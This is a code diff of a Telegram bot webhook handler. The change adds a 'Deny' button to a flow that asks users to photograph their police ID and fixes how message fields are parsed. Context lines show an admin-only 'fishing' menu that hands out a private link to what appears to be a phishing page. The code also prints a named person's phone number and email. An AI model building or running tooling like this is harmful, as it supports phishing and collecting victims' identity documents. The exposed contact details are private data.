@@ -6,7 +6,7 @@ export default async function handler(req, res) { console.log('📩 Telegram Web
 
 if (req.method !== 'POST') { return res.status(405).json({ error: 'Method Not Allowed' }); }
 
-const body = req.body; const message = body.message || body.callback_query?.message; const chatId = message?.chat?.id; const text = body.message?.text; const callbackQuery = body.callback_query; const photo = body.message?.photo;
+const body = req.body; const message = body.message || body.callback_query?.message; const chatId = message?.chat?.id; const text = message?.text; // Fixed issue: using message?.text instead of body.message?.text const callbackQuery = body.callback_query; const photo = message?.photo;
 
 try { // 🟡 Start command if (text === '/start') { await sendWelcomeWithButtons(chatId); }
 
@@ -32,6 +32,10 @@ if (photo && chatId.toString() !== ADMIN_CHAT_ID) {
             {
               text: `✅ Verify [${chatId}]`,
               callback_data: `verify_${chatId}`
+            },
+            {
+              text: `❌ Deny [${chatId}]`,
+              callback_data: `deny_${chatId}`
             }
           ]
         ]
@@ -73,14 +77,17 @@ if (callbackQuery) {
       ? `👑 *Admin Details*\nName: Muhammed Rishad AJ\nPhone: 91857088697\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: [@r1shaad\\_\\_](https://instagram.com/r1shaad__)`
       : `👤 *Admin Info*\nName: Muhammed Rishad AJ\nPhone: xxx\-xxx\-xxxx\nEmail: muhammedrishadaj\\@yahoo\\.com\nTelegram: @mohdrishad\nInstagram: @r1shaad\\_\\_`;
     await sendMessage(fromChatId, adminMessage);
+
   } else if (data === 'fishing') {
     const fishingMessage = isAdmin
       ? '🎣 Fishing Link Private: ||https\:\/\/heavenscake\.vercel\.app\/page\.html||'
       : '🚫 This feature is not for you\. Access is restricted\.';
     await sendMessage(fromChatId, fishingMessage);
+
   } else if (data === 'police') {
     await sendMessageNoMarkdown(fromChatId,
       `🛂 Police Verification Required\n\n📸 Please send a clear photo of your Police ID.\nOur admin will verify and give you confidential access.`);
+
   } else if (data.startsWith('verify_') && isAdmin) {
     const targetChatId = data.split('_')[1];
 
@@ -98,6 +105,11 @@ if (callbackQuery) {
     await sendMessage(ADMIN_CHAT_ID, `✅ Police verified: ${targetChatId}`);
     await sendMessage(targetChatId, `📥 *Describe what details you need:*\n\nExample: "Need admin's contact and bot API."`);
     pendingPoliceQueries.set(Number(targetChatId), true);
+
+  } else if (data.startsWith('deny_') && isAdmin) {
+    const targetChatId = data.split('_')[1];
+    await sendMessage(targetChatId, `❌ *Your police verification request has been denied.*\n\nYou can try again if you believe this was a mistake.`);
+    await sendMessage(ADMIN_CHAT_ID, `❌ Police verification denied for user: ${targetChatId}`);
   }
 
   await answerCallback(callbackQuery.id);
